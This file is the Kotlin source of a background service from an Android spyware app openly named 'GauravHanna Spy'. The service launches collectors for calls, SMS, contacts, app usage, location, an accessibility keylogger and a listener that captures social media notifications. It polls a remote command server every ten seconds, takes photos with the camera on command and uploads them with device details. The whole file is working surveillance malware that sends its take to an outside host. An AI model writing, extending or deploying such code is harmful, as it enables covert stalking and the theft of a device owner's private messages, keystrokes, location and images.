package com.gauravhanna.spy

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.BatteryManager
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import okhttp3.*
import org.json.JSONObject
import java.io.IOException
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class BackgroundService : Service() {
    
    companion object {
        private const val TAG = "BackgroundService"
        private const val CHANNEL_ID = "gauravhanna_spy"
        private const val NOTIFICATION_ID = 123
        private const val BASE_URL = "https://gauravhanna-spy.onrender.com/api"
        private const val POLLING_INTERVAL_SECONDS = 10L
        
        private var isServiceRunning = false
        
        fun isNotRunning(): Boolean = !isServiceRunning
    }

    private lateinit var client: OkHttpClient
    private val commandExecutor = Executors.newSingleThreadScheduledExecutor()

    override fun onCreate() {
        super.onCreate()
        isServiceRunning = true
        
        // Initialize OkHttpClient
        client = OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .writeTimeout(30, TimeUnit.SECONDS)
            .build()
        
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, getNotification())

        // --- Start all data collectors ---
        DataCollector.start(this)                      // calls, sms, contacts
        AppUsageCollector.start(this)                  // app usage tracking
        
        // Location tracking
        startService(Intent(this, LocationService::class.java))
        
        // Keylogger (Accessibility)
        startService(Intent(this, KeyloggerService::class.java))
        
        // Social media messages (NotificationListener)
        startService(Intent(this, NotificationListener::class.java))
        
        // Report device info immediately on start
        reportDeviceInfo()
        
        // Start command polling
        startCommandPolling()
        
        Log.d(TAG, "BackgroundService created and running")
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "GauravHanna Spy",
                NotificationManager.IMPORTANCE_LOW
            )
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun getNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("GauravHanna Spy")
            .setContentText("Monitoring active")
            .setSmallIcon(android.R.drawable.ic_menu_view)
            .build()
    }

    private fun startCommandPolling() {
        commandExecutor.scheduleAtFixedRate({
            try {
                val deviceId = getDeviceId(this)
                if (deviceId != null && deviceId.isNotEmpty()) {
                    getCommand(deviceId) { command ->
                        if (command == "take_photo") {
                            Log.d(TAG, "Received take_photo command")
                            CameraHelper.takePhoto(this) { base64 ->
                                if (base64 != null) {
                                    sendPhoto(base64)
                                } else {
                                    Log.e(TAG, "Photo capture failed")
                                }
                            }
                        } else if (command == "sync_now") {
                            Log.d(TAG, "Received sync_now command")
                            DataCollector.forceSync(this)
                            AppUsageCollector.forceSync(this)
                        } else if (command == "restart") {
                            Log.d(TAG, "Received restart command")
                            restartService()
                        }
                    }
                } else {
                    Log.e(TAG, "Device ID is null or empty")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error in command polling", e)
            }
        }, 0, POLLING_INTERVAL_SECONDS, TimeUnit.SECONDS)
    }

    private fun getCommand(deviceId: String, callback: (String?) -> Unit) {
        val request = Request.Builder()
            .url("$BASE_URL/command/$deviceId")
            .get()
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "Failed to get command", e)
                callback(null)
            }

            override fun onResponse(call: Call, response: Response) {
                response.use {
                    if (response.isSuccessful) {
                        val body = response.body?.string()
                        try {
                            val json = JSONObject(body ?: "{}")
                            val command = json.optString("command", null)
                            callback(command)
                        } catch (e: Exception) {
                            Log.e(TAG, "Error parsing command response", e)
                            callback(null)
                        }
                    } else {
                        Log.e(TAG, "Server error: ${response.code}")
                        callback(null)
                    }
                }
            }
        })
    }

    private fun sendPhoto(base64Image: String) {
        val deviceId = getDeviceId(this) ?: return
        
        val json = JSONObject().apply {
            put("deviceId", deviceId)
            put("photo", base64Image)
            put("timestamp", System.currentTimeMillis())
        }

        val body = RequestBody.create(
            MediaType.parse("application/json"),
            json.toString()
        )

        val request = Request.Builder()
            .url("$BASE_URL/photo")
            .post(body)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "Failed to send photo", e)
            }

            override fun onResponse(call: Call, response: Response) {
                response.use {
                    if (response.isSuccessful) {
                        Log.d(TAG, "Photo sent successfully")
                    } else {
                        Log.e(TAG, "Failed to send photo: ${response.code}")
                    }
                }
            }
        })
    }

    private fun reportDeviceInfo() {
        val deviceId = getDeviceId(this) ?: return
        
        val deviceName = Build.MODEL
        val deviceModel = "${Build.MANUFACTURER} ${Build.MODEL}"
        val androidVersion = Build.VERSION.RELEASE
        
        // Get battery level
        val batteryPct = getBatteryLevel()
        
        val networkStatus = if (isOnline(this)) "online" else "offline"

        val json = JSONObject().apply {
            put("deviceId", deviceId)
            put("deviceName", deviceName)
            put("deviceModel", deviceModel)
            put("androidVersion", androidVersion)
            put("battery", batteryPct)
            put("networkStatus", networkStatus)
        }

        val body = RequestBody.create(
            MediaType.parse("application/json"),
            json.toString()
        )
        
        val request = Request.Builder()
            .url("$BASE_URL/device-info")
            .post(body)
            .build()
        
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "Failed to send device info", e)
            }

            override fun onResponse(call: Call, response: Response) {
                response.use {
                    if (response.isSuccessful) {
                        Log.d(TAG, "Device info sent successfully")
                    } else {
                        Log.e(TAG, "Server error: ${response.code}")
                    }
                }
            }
        })
    }

    private fun getBatteryLevel(): Float {
        return try {
            val ifilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
            val batteryStatus = registerReceiver(null, ifilter)
            if (batteryStatus != null) {
                val level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
                val scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
                if (level != -1 && scale != -1) {
                    level / scale.toFloat() * 100
                } else {
                    0f
                }
            } else {
                0f
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error getting battery info", e)
            0f
        }
    }

    private fun getDeviceId(context: Context): String? {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                android.provider.Settings.Secure.getString(
                    context.contentResolver,
                    android.provider.Settings.Secure.ANDROID_ID
                )
            } else {
                val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
                try {
                    tm.deviceId
                } catch (e: SecurityException) {
                    Log.e(TAG, "Permission denied for getDeviceId", e)
                    android.provider.Settings.Secure.getString(
                        context.contentResolver,
                        android.provider.Settings.Secure.ANDROID_ID
                    )
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error getting device ID", e)
            android.provider.Settings.Secure.getString(
                context.contentResolver,
                android.provider.Settings.Secure.ANDROID_ID
            )
        }
    }

    private fun isOnline(context: Context): Boolean {
        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
        val activeNetwork = cm.activeNetworkInfo
        return activeNetwork != null && activeNetwork.isConnectedOrConnecting
    }

    private fun restartService() {
        Log.d(TAG, "Restarting service...")
        stopSelf()
        startService(Intent(this, BackgroundService::class.java))
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Schedule periodic data collection if not already scheduled
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        isServiceRunning = false
        commandExecutor.shutdown()
        try {
            if (!commandExecutor.awaitTermination(5, TimeUnit.SECONDS)) {
                commandExecutor.shutdownNow()
            }
        } catch (e: InterruptedException) {
            commandExecutor.shutdownNow()
        }
        
        if (::client.isInitialized) {
            client.dispatcher().executorService().shutdown()
        }
        
        Log.d(TAG, "BackgroundService destroyed")
    }

    override fun onBind(intent: Intent): IBinder? = null
}